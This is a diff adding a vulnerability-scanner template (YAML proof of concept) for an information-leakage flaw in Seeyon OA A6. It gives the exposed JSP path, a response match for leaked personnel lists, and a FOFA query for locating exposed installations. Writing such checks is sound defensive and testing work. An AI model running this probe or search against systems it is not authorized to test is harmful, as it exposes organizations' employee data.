@@ -1,0 +1,14 @@
+id: poc-yaml-seeyon-initdataassess-jsp-information-leakage
+info:
+  name: 致远OA A6 initDataAssess.jsp 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 致远互联-OA
+  fofa: title="致远A8+协同管理软件.A6"
+requests:
+- method: GET
+  path: /yyoa/assess/js/initDataAssess.jsp
+  expression: status_code == 200 && contains(body,"personList") && contains(body,"personHash.Add")
+variables: {}
+transport: http
